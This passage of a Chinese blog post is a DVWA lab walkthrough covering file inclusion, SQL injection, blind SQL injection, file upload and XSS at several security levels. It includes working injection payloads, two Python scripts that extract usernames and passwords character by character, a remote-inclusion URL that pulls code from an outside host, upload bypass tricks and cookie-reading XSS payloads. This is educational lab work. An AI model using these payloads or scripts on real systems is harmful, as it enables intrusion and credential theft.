+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]; <span class="hljs-comment">//The page we wish to display </span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>当服务器的php配置中，选项allow_url_fopen on与allow_url_includeon为开启状态时，并且  magic_quotes_gpc = Off.服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
+<p>使用url进行远程包含 <a target="_blank" rel="noopener" href="http://192.168.66.133/dvwa/vulnerabilities/fi/?page=http://121.196.162.32/a.txt">http://192.168.66.133/dvwa/vulnerabilities/fi/?page=http://121.196.162.32/a.txt</a></p>
+</li>
+<li><p>在medium模式下源码使用str_replace进行过滤，但是str_replace只是进行替换，进行双写即可绕过结果如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705140919848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>在high模式下使用fnmatch进行判断，其作用为：fnmatch函数检查page参数，要求page参数的开头必须是file，此时使用file协议进行绕过构造url page=file:///../1.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705140932489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><ol>
+<li><p>设置low模式下，进行手动注入尝试。首先尝试最常用的1’ or 1=1;#</p>
+<p>发现注入点如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705151055735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>进一步使用order by 进行输出字段的尝试，当order by 3时出错，说明有字段数为2</p>
+<p>下一步进行数据库的基本查询sql：0‘ union select database(),user()</p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705151131651.png#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>此后对数据库内容进行查询，首先是表名，sql：0’ union select database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())#</p>
+<p>结果如图:</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705151154661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>之后选取表进行列名的注入sql: 0’ union select database(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’)#</p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705151605887.png#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>最后进行表内容的注入sql:0’ union select database(),(select group_concat(user) from users);#</p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705151614342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置medium模式下，对输入进行了限制，尝试通过bp抓包直接进行注入</p>
+<p>抓包后修改内容进行基本注入，发现字符注入始终错误，尝试其他类型注入。</p>
+<p>发现数值型注入可以得到回显，结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705152411417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>之后按照low模式下的方法继续注入即可。</p>
+</li>
+<li><p>设置high模式下，对内容进行抓包后发现是post传输内容，sql：1’ or 1=1;#</p>
+<p>方法与之前相似。</p>
+</li>
+</ol>
+<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><ol>
+<li><p>设置low模式下，发现内容没有回显，只是显示id存在，经过初步判断可以得知为字符型注入。此时编写python脚本获取数据库长度及名称，代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nr</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            url_q=url+<span class="hljs-string">&quot;/dvwa/vulnerabilities/sqli_blind/?id=&quot;</span>+sql.<span class="hljs-built_in">format</span>(i,j)+<span class="hljs-string">&quot;&amp;Submit=Submit&quot;</span><br>            <span class="hljs-comment"># print(url_q)</span><br>            r=requests.get(url=url_q,headers=header)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;User ID exists in the database&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br>header=&#123;<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;security=low; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>&#125;<br>s=<span class="hljs-string">&quot;asdfghjklqwertyuiopzxcvbnm-+=,._1234567890&#125;&#123;&quot;</span><br><span class="hljs-comment"># 数据库名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#表名</span><br><span class="hljs-comment">#　sql=&quot;0&#x27; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#字段名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br><span class="hljs-comment">#具体内容 concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)</span><br>sql=<span class="hljs-string">&quot;0&#x27; or substr((selEct group_concat(concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)) from users),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br>url=<span class="hljs-string">&quot;http://192.168.66.133/&quot;</span><br>nr(url,sql)<br><br></code></pre></div></td></tr></table></figure>
+
+<p>最后得到结果如图：</p>
+<ol>
+<li><p>数据库名称：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706131122158.png#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>数据库表：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706131130377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>数据库表列名：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706131130476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>具体内容：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706131130473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+</li>
+<li><p>设置medium模式下，抓包后发现是利用post进行传输，且使用函数mysqli_real_escape_string对内容进行过滤，将代码修改如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nr</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            url_q=url+<span class="hljs-string">&quot;/dvwa/vulnerabilities/sqli_blind/&quot;</span><br>            <span class="hljs-built_in">print</span>(url_q)<br>            data=&#123;<br>                <span class="hljs-string">&quot;id&quot;</span> : sql.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(j))),<br>                <span class="hljs-string">&#x27;Submit&#x27;</span>: <span class="hljs-string">&#x27;Submit&#x27;</span><br>            &#125;<br>            <span class="hljs-built_in">print</span>(data)<br>            r=requests.post(url=url_q,data=data,headers=header)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;User ID exists in the database&#x27;</span> <span class="hljs-keyword">in</span> r.text):<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br>header=&#123;<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;security=low; PHPSESSID=06jsdi4p6auso911ivb42u2eg4&#x27;</span><br>&#125;<br>s=<span class="hljs-string">&quot;asdfghjklqwertyuiopzxcvbnm-+=,._1234567890&#125;&#123;&quot;</span><br><span class="hljs-comment"># 数据库名</span><br><span class="hljs-comment"># sql=&quot;0 or substr((select database()),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#表名</span><br><span class="hljs-comment">#　sql=&quot;0&#x27; or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#字段名</span><br><span class="hljs-comment"># sql=&quot;0&#x27; or substr((seLEct group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1)=&#123;&#125;;%23&quot;</span><br><span class="hljs-comment">#具体内容 concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)</span><br>sql=<span class="hljs-string">&quot;0&#x27; or substr((selEct group_concat(concat(user,&#x27;,&#x27;,password,&#x27;-&#x27;)) from users),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;;%23&quot;</span><br>url=<span class="hljs-string">&quot;http://192.168.66.133/&quot;</span><br>nr(url,sql)<br><br></code></pre></div></td></tr></table></figure>
+
+<p>3.设置high模式下，类似low方式注入但是现在不知道如何编写脚本，只能手工注入。且最后使用# 不能使用%23</p>
+</li>
+</ol>
+<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><ol>
+<li><p>设置low模式下，可直接上传php文件如图显示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705141957871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置medium模式下，源码显示检测文件类型和大小，此时应该在bp抓包后对类型进行修改后上传即可</p>
+<p>将上传的包修改如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705142158210.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功结果</p>
+<p><img src="https://img-blog.csdnimg.cn/2021070514243225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置high模式下，对最后一个后缀进行了检测和图片类型进行了检测尝试进行%00截断构造如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705144322108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>结果无效，尝试window的::$DATA绕过也无效</p>
+<p>构造如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705144356216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>尝试上传图片木马需要杯包含才能执行，构造图片马如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705145205795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>此时成功，利用上面的文件包含可以运行文件，此时使用phpinfo();作为查看，结果如图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705145252732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+<h1 id="XSS-reflected"><a href="#XSS-reflected" class="headerlink" title="XSS reflected"></a>XSS reflected</h1><ol>
+<li><p>设置low模式下，尝试进行xss，直接输入 &lt;script&gt;alert(0)&lt;/script&gt; </p>
+<p>结果如图：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705161916393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>进行其他的xss如：&lt;body onload=alert(‘0’)&gt; </p>
+<p>&lt;a href=’’ onclick=alert(‘0’)&gt;click1&lt;/a&gt; 点击click1时弹出</p>
+<p>&lt;img src=’<a target="_blank" rel="noopener" href="http://192.168.10.128/a.jpg&#39;">http://192.168.10.128/a.jpg&#39;</a> onerror=alert(document.cookie)&gt; src地址错误，然后执行onerror的内容</p>
+</li>
+<li><p>设置medium模式下，继续尝试&lt;script&gt;alert(0)&lt;/script&gt; 发现无效，查看源码后发现使用str_replace对&lt;script&gt;进行了过滤，此时可以使用其他绕过，也可以使用大小写，双写绕过，如：&lt;sCript&gt;alert(0)&lt;/script&gt; 、&lt;scr&lt;script&gt;ipt&gt;alert(0)&lt;/script&gt; 、&lt;img src=’<a target="_blank" rel="noopener" href="http://192.168.10.128/a.jpg&#39;">http://192.168.10.128/a.jpg&#39;</a> onerror=alert(document.cookie)&gt; 等等</p>
+<p>结果如图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210705161930950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>3.设置high模式下，进行尝试，尝试后发现script无法使用，使用其他还是可以，查看源码后，发现使用preg_replace进行过滤。</p>
+<p>preg_replace 函数执行一个正则表达式的搜索和替换。无法使用script进行操作，使用其它的标签即可</p>
+</li>
+</ol>
+<h1 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS stored"></a>XSS stored</h1><ol>
+<li><p>设置low模式下，对源码进行查看之后发现代码对sql注入进行了防护，但是对于xss没有防护，但是在前端对输入长度进行了限制，直接更改前端代码后，写入xss代码：&lt;script&gt;alert(1)&lt;/script&gt;</p>
+<p>结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/2021070609344458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置medium模式下，对源码查看发现对message部分进行了严格的过滤，但是对于name部分只是使用了str_replace进行对&lt;script&gt;进行了过滤，所以对name部分可以使用双写或大小写绕过，写入xss代码：&lt;sCript&gt;alert(2)&lt;/script&gt;、&lt;sc&lt;script&gt;ript&gt;alert(2)&lt;/script&gt;</p>
+<p>结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706093516681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>前端显示代码如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706093540742.png#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>设置high模式下，对源码查看之后发现只是对于name部分的代码进行了更加严格的过滤，但是只是限制了&lt;script&gt;标签的使用，此时使用其他标签即可，写入代码：&lt;img src=’’ onerror=alert(document.cookie)&gt;</p>
+<p>结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706093555809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" lazyload></p>
+<p>前端显示代码为：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210706093621408.png#pic_center" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E5%AE%89-%E9%9D%B6%E6%9C%BA/">信安 靶机</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9Etop10/">漏洞top10</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>MyBlog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
